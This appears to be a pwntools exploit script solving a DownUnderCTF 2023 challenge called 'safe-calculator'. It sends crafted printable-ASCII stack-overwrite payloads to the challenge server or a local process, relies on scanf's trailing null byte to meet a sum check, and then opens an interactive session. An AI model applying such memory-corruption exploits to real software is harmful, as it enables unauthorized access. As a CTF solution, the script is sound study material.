#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './safe-calculator'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
host, port = '2023.ductf.dev', 30015

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *calculate+23
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()

# payload must be printable ascii 0x20 - 0x7e
#                                           arg1                                arg2
payload = b'a'*32 + p32(0x61616161) + p32(0x5c462f37) + p32(0x61616161) + p32(0x5d463032) # 0x5d4630YY, 32 as temp value
info('payload: %s', payload)
io.sendlineafter(b'>', b'2')
io.send(payload)

# overwriting 32 to null byte so that YY = 0x00, scanf automatically append a null byte.
# because comparison arg1 + arg2 = 0xb98c5f37
# with constraint a byte of our payload >= 0x20 && <= 0x7e,
# it would be impossible to find such value that adds up to 0x37
# so 0x37 + 0x00 is the only way
payload = b'a'*32 + p32(0x61616161) + p32(0x5c462f37) + p32(0x61616161)
info('payload: %s', payload)
io.sendlineafter(b'>', b'2')
io.sendline(payload)

io.sendlineafter(b'>', b'1')
io.interactive()